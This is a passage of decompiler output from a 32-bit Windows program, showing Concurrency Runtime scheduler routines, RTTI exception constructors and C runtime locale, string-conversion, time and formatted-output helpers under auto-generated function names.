char __thiscall sub_45D481(int this, int *a2, int a3, char a4, char a5)
{
  int *v5; // edi
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  int v15; // esi
  char v16; // al
  int *v17; // edx
  _DWORD *v18; // ecx
  int v19; // eax
  int v20; // eax
  _DWORD *v21; // ecx
  int v22; // eax
  _DWORD *v23; // ecx
  _DWORD *v24; // esi
  int v25[3]; // [esp+8h] [ebp-2Ch] BYREF
  int v26; // [esp+14h] [ebp-20h]
  int v27; // [esp+18h] [ebp-1Ch]
  int v28; // [esp+1Ch] [ebp-18h]
  int v29; // [esp+20h] [ebp-14h]
  _DWORD *v30; // [esp+24h] [ebp-10h]
  int *v31; // [esp+28h] [ebp-Ch]
  _DWORD *v32; // [esp+2Ch] [ebp-8h]
  char v33; // [esp+33h] [ebp-1h]

  v5 = a2;
  v33 = 0;
  if ( sub_45CFF4((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_45CFBB(v9, TickCount64);
  if ( sub_45CB7C((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_45095A(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_45DF3F(v12 - 53);
            if ( v11 )
            {
              v13 = sub_45CA7E(v25, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v33 = 1;
              break;
            }
          }
        }
        else if ( sub_45D09D(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v30 = *(_DWORD **)(*(_DWORD *)this + 84);
  if ( v33 )
  {
LABEL_44:
    v23 = (_DWORD *)v5[1];
    v24 = (_DWORD *)v23[2];
    sub_45DDB6(v23, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    sub_457ABE(*(_DWORD *)this, (*(_DWORD *)(v5[1] + 12) & 0xFFFFFFF) == 0, v24 == v30);
  }
  else
  {
    v15 = !*(_BYTE *)(v14 + 96) && !sub_457057(v14) && !a4;
    v16 = v33;
    LOBYTE(v28) = 1;
    while ( v15 <= 2 )
    {
      v17 = (int *)a3;
      v29 = dword_494544[v15];
      v18 = v30;
      v31 = (int *)a3;
      v32 = v30;
      if ( v30 )
      {
        v19 = a5 & 0x14;
        v26 = v19;
        while ( 1 )
        {
          if ( v19 )
          {
            if ( sub_45D8E9(this, v5, v18, (int)v17, (a5 & 4) != 0, v29, a5, a4) )
              break;
            v18 = v32;
            v17 = v31;
          }
          if ( (a5 & 0xA) != 0 && sub_45D6DF(this, v5, v18, v17, (a5 & 2) != 0, v29, a5, a4) )
            break;
          v20 = a5 & 1;
          v27 = v20;
          if ( (a5 & 1) != 0 )
          {
            if ( sub_45D7DB(this, v5, v32, (int)v31, v28, v29, a5, a4)
              || v15 == 2 && sub_45DED0(this, v5, (_DWORD *)v32[1], *(int **)this) )
            {
              break;
            }
            v20 = v27;
          }
          if ( (_BYTE)v28 && v20 && sub_45CBB2((_DWORD *)this, v5, *(int **)this, 1) )
            break;
          v21 = *(_DWORD **)(this + 4);
          LOBYTE(v28) = 0;
          v31 = 0;
          v22 = sub_4509CB(v21, (int)v30, (int)v32);
          v17 = v31;
          v18 = (_DWORD *)v22;
          v19 = v26;
          v32 = v18;
          if ( !v18 )
          {
            v16 = v33;
            goto LABEL_42;
          }
        }
        v33 = 1;
        goto LABEL_44;
      }
LABEL_42:
      ++v15;
      if ( v16 )
      {
        v33 = v16;
        goto LABEL_44;
      }
    }
  }
  return v33;
}
// 44A95D: using guessed type __int64 j____crtGetTickCount64(void);
// 494544: using guessed type int dword_494544[3];
// 45D481: using guessed type int var_2C[3];

//----- (0045D6DF) --------------------------------------------------------
char __thiscall sub_45D6DF(int this, int *a2, _DWORD *a3, int *a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int *v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_45CD5E((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_45CC8E(a3, &v14);
    else
      v8 = sub_45CCC9(a3, &v14);
    v9 = (int *)v8;
    for ( i = v14; ; v9 = (int *)sub_45098F(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_45CAA4(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_45D030(v10, a2, a8, a7) )
        return 1;
      if ( !sub_45DE02((_DWORD *)this, (int)v9, (int)a4, a6, a8) && sub_45CD07(a2, v9, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (0045D7DB) --------------------------------------------------------
char __thiscall sub_45D7DB(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v9; // eax
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( (!a4 || !sub_45CE1C((_DWORD *)this, a2, a4, a6, a8))
    && (!a5 || !sub_45DED0(this, a2, *(_DWORD **)(*(_DWORD *)this + 80), *(int **)this)) )
  {
    if ( a6 )
      v9 = sub_45CC8E(a3, &v14);
    else
      v9 = sub_45CCC9(a3, &v14);
    for ( i = v14; ; v9 = sub_45098F(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      v13 = v9;
      if ( !v9 )
        return 0;
      v10 = (int *)sub_45CAA4(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_45D030(v10, a2, a8, a7) )
        return 1;
      if ( !sub_45DE02((_DWORD *)this, v13, a4, a6, a8) && sub_45CDDF(a2, v13) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (0045D8E9) --------------------------------------------------------
char __thiscall sub_45D8E9(int this, int *a2, _DWORD *a3, int a4, char a5, int a6, char a7, char a8)
{
  int v8; // eax
  int v9; // ebx
  int *v10; // eax
  int i; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+14h] [ebp-4h] BYREF

  if ( !a4 || !sub_45CEEA((_DWORD *)this, a2, a4, a5, a6, a8) )
  {
    if ( a6 )
      v8 = sub_45CC8E(a3, &v14);
    else
      v8 = sub_45CCC9(a3, &v14);
    v9 = v8;
    for ( i = v14; ; v9 = sub_45098F(&v14, i, (_DWORD *)((char *)a3 + (a6 != 0 ? 16 : 96))) )
    {
      if ( !v9 )
        return 0;
      v10 = (int *)sub_45CAA4(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
      if ( v10 && sub_45D030(v10, a2, a8, a7) )
        return 1;
      if ( !sub_45DE02((_DWORD *)this, v9, a4, a6, a8) && sub_45CE97(a2, v9, a8, a5) )
        break;
    }
    if ( a6 )
      a3[44] = (v14 + 1) % a3[20];
    else
      a3[45] = (v14 + 1) % a3[40];
  }
  return 1;
}

//----- (0045D9E8) --------------------------------------------------------
char __thiscall sub_45D9E8(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // esi
  unsigned int v9; // eax
  _DWORD *v10; // eax
  char v11; // al
  _DWORD *v12; // ecx
  _DWORD *v13; // ecx
  unsigned int v14; // eax
  char v15; // al
  _DWORD *v16; // ecx
  unsigned int v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_45CFF4((_DWORD *)this, a2) )
    return 1;
  v8 = sub_4509F4(*(_DWORD **)(this + 4));
  v9 = a5;
  if ( (a5 & 1) == 0 )
  {
LABEL_9:
    if ( (v9 & 0xA) != 0 && (v13 = (_DWORD *)v8, (v23 = v8) != 0) )
    {
      v14 = (v9 >> 1) & 0xFFFFFF01;
      v20 = v14;
      while ( 1 )
      {
        v15 = sub_45DC09(a2, v13, v14);
        v12 = *(_DWORD **)(this + 4);
        v6 = v15;
        v19 = v23;
        if ( v15 )
          break;
        v13 = (_DWORD *)sub_4509CB(v12, v8, v23);
        v23 = (int)v13;
        LOBYTE(v14) = v20;
        if ( !v13 )
        {
          v9 = a5;
          goto LABEL_15;
        }
      }
    }
    else
    {
LABEL_15:
      if ( (v9 & 0x14) == 0 )
        return v6;
      v16 = (_DWORD *)v8;
      v24 = v8;
      if ( !v8 )
        return v6;
      v17 = (v9 >> 2) & 0xFFFFFF01;
      v21 = v17;
      while ( 1 )
      {
        v18 = sub_45DD1E(a2, v16, v17);
        v12 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v16 = (_DWORD *)sub_4509CB(v12, v8, v24);
        v24 = (int)v16;
        LOBYTE(v17) = v21;
        if ( !v16 )
          return v6;
      }
    }
    goto LABEL_21;
  }
  v22 = v8;
  v10 = (_DWORD *)v8;
  if ( v8 )
  {
    while ( 1 )
    {
      v11 = sub_45DC9D(a2, v10);
      v12 = *(_DWORD **)(this + 4);
      v6 = v11;
      v19 = v22;
      if ( v11 )
        break;
      v10 = (_DWORD *)sub_4509CB(v12, v8, v22);
      v22 = (int)v10;
      if ( !v10 )
        goto LABEL_7;
    }
LABEL_21:
    sub_4520F0(v12, v19);
    return v6;
  }
LABEL_7:
  v6 = sub_45DE8E((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  if ( !v6 )
  {
    v9 = a5;
    goto LABEL_9;
  }
  return v6;
}

//----- (0045DAFB) --------------------------------------------------------
char __thiscall sub_45DAFB(int this, int *a2, int a3, int a4, unsigned int a5)
{
  char v6; // bl
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // ecx
  unsigned int v11; // eax
  char v12; // al
  _DWORD *v13; // ecx
  _DWORD *v14; // ecx
  unsigned int v15; // eax
  char v16; // al
  _DWORD *v17; // eax
  char v18; // al
  int v19; // [esp-8h] [ebp-18h]
  char v20; // [esp+8h] [ebp-8h]
  char v21; // [esp+8h] [ebp-8h]
  int v22; // [esp+Ch] [ebp-4h]
  int v23; // [esp+Ch] [ebp-4h]
  int v24; // [esp+Ch] [ebp-4h]

  v6 = 0;
  if ( sub_45CFF4((_DWORD *)this, a2) )
    return 1;
  v8 = sub_4509F4(*(_DWORD **)(this + 4));
  v9 = v8;
  if ( (a5 & 0x14) != 0 )
  {
    v10 = (_DWORD *)v8;
    v22 = v8;
    if ( v8 )
    {
      v11 = (a5 >> 2) & 0xFFFFFF01;
      v20 = v11;
      do
      {
        v12 = sub_45DD1E(a2, v10, v11);
        v13 = *(_DWORD **)(this + 4);
        v6 = v12;
        v19 = v22;
        if ( v12 )
          goto LABEL_19;
        v10 = (_DWORD *)sub_4509CB(v13, v9, v22);
        v22 = (int)v10;
        LOBYTE(v11) = v20;
      }
      while ( v10 );
    }
  }
  if ( (a5 & 0xA) != 0 )
  {
    v14 = (_DWORD *)v9;
    v23 = v9;
    if ( v9 )
    {
      v15 = (a5 >> 1) & 0xFFFFFF01;
      v21 = v15;
      do
      {
        v16 = sub_45DC09(a2, v14, v15);
        v13 = *(_DWORD **)(this + 4);
        v6 = v16;
        v19 = v23;
        if ( v16 )
          goto LABEL_19;
        v14 = (_DWORD *)sub_4509CB(v13, v9, v23);
        v23 = (int)v14;
        LOBYTE(v15) = v21;
      }
      while ( v14 );
    }
  }
  if ( (a5 & 1) != 0 )
  {
    v24 = v9;
    v17 = (_DWORD *)v9;
    if ( v9 )
    {
      while ( 1 )
      {
        v18 = sub_45DC9D(a2, v17);
        v13 = *(_DWORD **)(this + 4);
        v6 = v18;
        v19 = v24;
        if ( v18 )
          break;
        v17 = (_DWORD *)sub_4509CB(v13, v9, v24);
        v24 = (int)v17;
        if ( !v17 )
          return sub_45DE8E((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
      }
LABEL_19:
      sub_4520F0(v13, v19);
      return v6;
    }
    return sub_45DE8E((_DWORD **)this, a2, *(_DWORD **)(*(_DWORD *)this + 80));
  }
  return v6;
}

//----- (0045DC09) --------------------------------------------------------
char __stdcall sub_45DC09(int *a1, _DWORD *a2, char a3)
{
  int *v3; // esi
  int v4; // eax
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+14h] [ebp-Ch]
  int v8; // [esp+18h] [ebp-8h]
  int v9; // [esp+1Ch] [ebp-4h] BYREF

  v3 = (int *)sub_45CCC9(a2, &v9);
  v8 = v9;
  while ( v3 )
  {
    if ( a3 )
    {
      v4 = sub_45A746(v3);
      if ( v4 )
      {
        v6 = 2;
        v7 = v4;
LABEL_5:
        result = 1;
        a2[45] = (v9 + 1) % a2[40];
        *a1 = v6;
        a1[1] = (int)v3;
        a1[2] = v7;
        return result;
      }
    }
    else if ( sub_45A7A0(v3) )
    {
      v6 = 8;
      goto LABEL_5;
    }
    v3 = (int *)sub_45098F(&v9, v8, a2 + 24);
  }
  return 0;
}
// 45DC67: variable 'v7' is possibly undefined

//----- (0045DC9D) --------------------------------------------------------
char __stdcall sub_45DC9D(_DWORD *a1, _DWORD *a2)
{
  int v2; // edi
  int v3; // esi
  char result; // al
  _DWORD *v5; // esi
  int v6[3]; // [esp+Ch] [ebp-14h] BYREF
  int i; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v2 = sub_45CCC9(a2, &v8);
  for ( i = v8; ; v2 = sub_45098F(&v8, i, a2 + 24) )
  {
    if ( !v2 )
      return 0;
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    if ( v3 )
      break;
  }
  a2[45] = (v8 + 1) % a2[40];
  v5 = sub_45CA7E(v6, v3);
  result = 1;
  *a1 = *v5++;
  a1[1] = *v5;
  a1[2] = v5[1];
  return result;
}
// 45DC9D: using guessed type int var_14[3];

//----- (0045DD1E) --------------------------------------------------------
char __stdcall sub_45DD1E(int *a1, _DWORD *a2, char a3)
{
  int v3; // esi
  void *v4; // ebx
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v3 = sub_45CCC9(a2, &v8);
  v7 = v8;
  while ( v3 )
  {
    if ( a3 )
    {
      v4 = sub_45ADE3(v3, 0);
      if ( v4 )
      {
        v6 = 4;
LABEL_5:
        result = 1;
        a2[45] = (v8 + 1) % a2[40];
        *a1 = v6;
        a1[1] = v3;
        a1[2] = (int)v4;
        return result;
      }
    }
    else
    {
      v4 = sub_45A9AA(v3);
      if ( v4 )
      {
        v6 = 16;
        goto LABEL_5;
      }
    }
    v3 = sub_45098F(&v8, v7, a2 + 24);
  }
  return 0;
}

//----- (0045DDB6) --------------------------------------------------------
unsigned int __thiscall sub_45DDB6(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[66];
  if ( result > 0x64 )
  {
    result = a3;
    this[66] = a2;
    this[67] = a3;
  }
  return result;
}

//----- (0045DDDC) --------------------------------------------------------
unsigned int __thiscall sub_45DDDC(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[50];
  if ( result > 0x64 )
  {
    result = a3;
    this[50] = a2;
    this[51] = a3;
  }
  return result;
}

//----- (0045DE02) --------------------------------------------------------
bool __thiscall sub_45DE02(_DWORD *this, int a2, int a3, int a4, char a5)
{
  _DWORD *v7; // edx
  char v8; // bl
  bool v9; // zf

  if ( a2 == a3 )
    return 1;
  v7 = (_DWORD *)(a2 + 12);
  v8 = 0;
  switch ( a4 )
  {
    case 0:
      return (*v7 & 0xFFFFFFF) != 0;
    case 1:
      if ( (*v7 & 0xFFFFFFF) == 0 )
        return 1;
      v9 = !sub_45CA32((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12));
      break;
    case 2:
      if ( (*v7 & 0xFFFFFFF) == 0 || sub_45CA32((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12)) )
        return 1;
      if ( !sub_451304((_DWORD *)(this[1] + 60), a2 + 28) )
        return v8;
      v9 = a5 == 0;
      break;
    default:
      return v8;
  }
  if ( v9 )
    return 1;
  return v8;
}

//----- (0045DE8E) --------------------------------------------------------
char __thiscall sub_45DE8E(_DWORD **this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *i; // eax
  int v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  for ( i = (_DWORD *)sub_45CC41(this[1], &v6, -1); ; i = (_DWORD *)sub_45CC41(this[1], &v6, 0) )
  {
    if ( !i )
      return 0;
    if ( i != a3 && sub_45DED0((int)this, a2, i, 0) )
      break;
  }
  return 1;
}

//----- (0045DED0) --------------------------------------------------------
char __thiscall sub_45DED0(int this, _DWORD *a2, _DWORD *a3, int *a4)
{
  int *i; // eax
  __int32 v6; // eax
  int *v7; // esi
  char result; // al
  _DWORD *v9; // esi
  int v10[3]; // [esp+Ch] [ebp-10h] BYREF
  int v11; // [esp+18h] [ebp-4h] BYREF

  for ( i = (int *)sub_450429(a3, 0, a3[30], &v11); ; i = (int *)sub_450A37(a3, &v11, 0) )
  {
    v7 = i;
    if ( !i )
      return 0;
    if ( i != a4 )
    {
      sub_45DDDC(i, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
      v6 = sub_45DF3F(v7);
      if ( v6 )
        break;
    }
  }
  v9 = sub_45CA7E(v10, v6);
  result = 1;
  *a2 = *v9++;
  a2[1] = *v9;
  a2[2] = v9[1];
  return result;
}
// 45DED0: using guessed type int var_10[3];

//----- (0045DF3F) --------------------------------------------------------
__int32 __thiscall sub_45DF3F(int *this)
{
  int v1; // eax
  int *v2; // ecx
  int v3; // edx

  v1 = this[5];
  v2 = this + 4;
  v3 = 0;
  if ( v1 > *v2 )
    return sub_458075(v2, 0);
  return v3;
}

//----- (0045DF56) --------------------------------------------------------
void __thiscall sub_45DF56(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // edx
  void *v5; // eax

  v3 = sub_44CC5D(a2 + 1);
  v4 = this[1];
  v5 = *(void **)(v3 + 256);
  if ( *this == 2 )
  {
    if ( v5 == *(void **)(v4 + 256) )
      sub_4512CA(v5);
    else
      sub_459278(a2, v4, 0);
  }
  else if ( v5 != *(void **)(v4 + 256) )
  {
    sub_459278(a2, v4, 1);
  }
}

//----- (0045DFA3) --------------------------------------------------------
int __thiscall sub_45DFA3(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 4))(*(_DWORD *)(this + 8));
}

//----- (0045DFB7) --------------------------------------------------------
_DWORD *__thiscall sub_45DFB7(_DWORD *this, int a2, int a3)
{
  sub_456EF4(this);
  *this = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_45729D((int)this, a2, a3);
  return this;
}
// 494554: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (0045DFEE) --------------------------------------------------------
_DWORD *__thiscall sub_45DFEE(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_456F54(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 494554: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (0045E5F3) --------------------------------------------------------
int sub_45E5F3()
{
  return dword_500124;
}
// 500124: using guessed type int dword_500124;

//----- (004604CF) --------------------------------------------------------
char *__thiscall sub_4604CF(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::__non_rtti_object::`vftable';
  return this;
}
// 49458C: using guessed type void *std::__non_rtti_object::`vftable';

//----- (004604EA) --------------------------------------------------------
char *__thiscall sub_4604EA(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::bad_typeid::`vftable';
  return this;
}
// 494580: using guessed type void *std::bad_typeid::`vftable';

//----- (004608A8) --------------------------------------------------------
_DWORD *__cdecl sub_4608A8(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::__non_rtti_object::`vftable';
  return result;
}
// 49458C: using guessed type void *std::__non_rtti_object::`vftable';

//----- (004608C4) --------------------------------------------------------
_DWORD *__cdecl sub_4608C4(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::bad_cast::`vftable';
  return result;
}
// 490698: using guessed type void *std::bad_cast::`vftable';

//----- (00461F67) --------------------------------------------------------
int __cdecl sub_461F67(int a1)
{
  int result; // eax

  result = a1;
  dword_5001A0 = a1;
  return result;
}
// 5001A0: using guessed type int dword_5001A0;

//----- (004624F8) --------------------------------------------------------
int __cdecl sub_4624F8(int Char_value)
{
  if ( dword_500560 )
    return _islower_l(Char_value, 0);
  else
    return __acrt_locale_get_ctype_array_value(Locale_pctype_array, Char_value, 2);
}
// 500560: using guessed type int dword_500560;

//----- (00462529) --------------------------------------------------------
int __cdecl sub_462529(int Char_value)
{
  if ( dword_500560 )
    return sub_462458(Char_value, 0);
  else
    return __acrt_locale_get_ctype_array_value(Locale_pctype_array, Char_value, 8);
}
// 500560: using guessed type int dword_500560;

//----- (0046255A) --------------------------------------------------------
int __cdecl sub_46255A(int Char_value)
{
  if ( dword_500560 )
    return _isupper_l(Char_value, 0);
  else
    return __acrt_locale_get_ctype_array_value(Locale_pctype_array, Char_value, 1);
}
// 500560: using guessed type int dword_500560;

//----- (0046299E) --------------------------------------------------------
int __cdecl sub_46299E(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *a2, UINT CodePage)
{
  int v3; // ecx
  int var1; // [esp+1h] [ebp-1h] BYREF

  LOBYTE(var1) = HIBYTE(v3);
  return __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(
           lpMultiByteStr,
           a2,
           (int)&var1,
           CodePage);
}
// 4629A3: variable 'v3' is possibly undefined

//----- (004629BB) --------------------------------------------------------
int __cdecl sub_4629BB(LPCWCH lpWideCharStr, int a2, UINT CodePage)
{
  int v3; // ecx
  int var1; // [esp+1h] [ebp-1h] BYREF

  LOBYTE(var1) = HIBYTE(v3);
  return __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_0fec1a7b3f42a53036604e18c2d5e07e_,__crt_win32_buffer_no_resizing>(
           lpWideCharStr,
           a2,
           (int)&var1,
           CodePage);
}
// 4629C0: variable 'v3' is possibly undefined

//----- (00462A19) --------------------------------------------------------
int __thiscall sub_462A19(void **this, int a2)
{
  int result; // eax

  unknown_libname_91();
  result = __crt_win32_buffer_internal_dynamic_resizing::allocate(
             this + 2,
             2 * a2,
             (const struct __crt_win32_buffer_empty_debug_info *)this);
  if ( result )
  {
    this[3] = 0;
    *((_BYTE *)this + 20) = 0;
  }
  else
  {
    *((_BYTE *)this + 20) = 1;
    result = 0;
    this[3] = (void *)a2;
  }
  return result;
}
// 4629D8: using guessed type int unknown_libname_91(void);

//----- (00462E7B) --------------------------------------------------------
__int64 __cdecl sub_462E7B(__int64 *a1)
{
  __int64 result; // rax
  __int64 v2; // [esp+4h] [ebp-10h] BYREF
  int v3; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h]

  v2 = 0i64;
  v3 = 0;
  v4 = 0;
  if ( common_timespec_get<&void __acrt_GetSystemTimePreciseAsFileTime(_FILETIME *),_timespec64>(&v2, 1) == 1 )
    result = v2;
  else
    result = -1i64;
  if ( a1 )
    *a1 = result;
  return result;
}
// 462DF8: using guessed type _DWORD __cdecl common_timespec_get<&void __acrt_GetSystemTimePreciseAsFileTime(_FILETIME *),_timespec64>(_DWORD, _DWORD);

//----- (0046310D) --------------------------------------------------------
int __cdecl sub_46310D(int a1)
{
  int result; // eax

  result = a1;
  dword_5001A8 = a1;
  return result;
}
// 5001A8: using guessed type int dword_5001A8;

//----- (004638B1) --------------------------------------------------------
int __cdecl sub_4638B1(
        int a1,
        int a2,
        int *a3,
        unsigned int a4,
        unsigned int a5,
        int a6,
        struct __crt_locale_pointers *a7,
        int a8)
{
  int result; // eax
  int *v9; // eax
  int v10; // [esp+0h] [ebp-4h]
  int v11; // [esp+0h] [ebp-4h]

  if ( !a6 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  if ( a5 )
  {
    if ( !a3 )
      goto LABEL_10;
  }
  else if ( !a3 )
  {
    if ( !a4 )
      return 0;
    goto LABEL_10;
  }
  if ( a4 )
  {
    v10 = 1;
    goto LABEL_11;
  }
LABEL_10:
  v10 = 0;
LABEL_11:
  v9 = _errno();
  if ( !v10 )
  {
    *v9 = 22;
LABEL_18:
    _invalid_parameter_noinfo();
    return -1;
  }
  v11 = *v9;
  if ( a4 > a5 )
  {
    result = sub_463999(a1, a2, a3, a5 + 1, a6, a7, a8);
    if ( result != -2 )
      goto LABEL_15;
LABEL_23:
    if ( *_errno() == 34 )
      *_errno() = v11;
    return -1;
  }
  result = sub_463999(a1, a2, a3, a4, a6, a7, a8);
  *((_BYTE *)a3 + a4 - 1) = 0;
  if ( result == -2 )
  {
    if ( a5 != -1 )
      goto LABEL_16;
    goto LABEL_23;
  }
LABEL_15:
  if ( result >= 0 )
    return result;
LABEL_16:
  *(_BYTE *)a3 = 0;
  if ( result == -2 )
  {
    *_errno() = 34;
    goto LABEL_18;
  }
  return -1;
}

//----- (00463999) --------------------------------------------------------
int __cdecl sub_463999(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_96(&v17, a1, a2, a5, v12, a7);
  v20 = 0;
  v9 = sub_464398((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 463F9E: using guessed type _DWORD __stdcall unknown_libname_96(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 463999: using guessed type char var_45C[64];
// 463999: using guessed type char var_41C[1040];

//----- (00463B17) --------------------------------------------------------
int __cdecl sub_463B17(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1040]; // [esp+6Ch] [ebp-41Ch] BYREF
  int v20; // [esp+47Ch] [ebp-Ch]

  v17 = a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
